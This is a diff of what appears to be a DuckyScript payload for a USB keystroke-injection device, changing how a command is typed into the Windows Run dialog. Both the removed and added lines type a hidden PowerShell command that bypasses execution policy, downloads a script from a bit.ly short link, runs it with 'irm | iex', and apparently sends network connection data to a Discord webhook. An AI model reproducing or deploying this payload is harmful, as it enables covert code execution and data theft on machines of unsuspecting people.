@@ -32,4 +32,5 @@ REM
 DELAY 2000
 GUI r
 DELAY 250
-STRINGLN powershell -w h -ep bypass $discord='<your-webhook-here>';$d='1';$r='1';$lc='1';$ln='1';$ac='1';$an='1';$o='1';$p='TCP';irm bit.ly/WindowsNetstatScript1 | iex
+STRING powershell -w h -ep bypass $discord='<your-webhook-here>';$d='1';$r='1';$lc='1';$ln='1';$ac='1';$an='1';$o='1';$p='TCP';irm bit.ly/WindowsNetstatScript1 | iex
+ENTER
